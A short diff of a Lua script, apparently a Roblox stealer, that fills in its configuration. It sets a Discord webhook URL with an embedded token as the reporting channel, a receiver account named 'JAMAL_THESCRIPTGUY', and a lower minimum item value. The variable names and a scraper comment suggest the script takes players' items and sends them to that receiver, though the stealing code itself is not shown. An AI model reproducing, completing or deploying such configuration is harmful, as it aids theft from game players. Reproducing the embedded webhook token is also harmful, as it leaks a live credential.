@@ -2,9 +2,9 @@ _G.Ex = _G.Ex or false
 if _G.Ex then return end
 _G.Ex = true
 
-local WEBHOOK = ""
-local RECEIVER = {""}
-local MINIMUM_VALUE = 10
+local WEBHOOK = "https://discord.com/api/webhooks/1540309263803617382/5UCVkYMAlBqTrj6-fm-mouP4aneoMhyOtBYEP_U6-dSScYB_ZHlVQOZhNm6Ml7g5kcTS"
+local RECEIVER = {"JAMAL_THESCRIPTGUY"}
+local MINIMUM_VALUE = 1
 local RECEIVERx = RECEIVER
 
 -- SupremeValueList URLs (all pages the scraper hits)
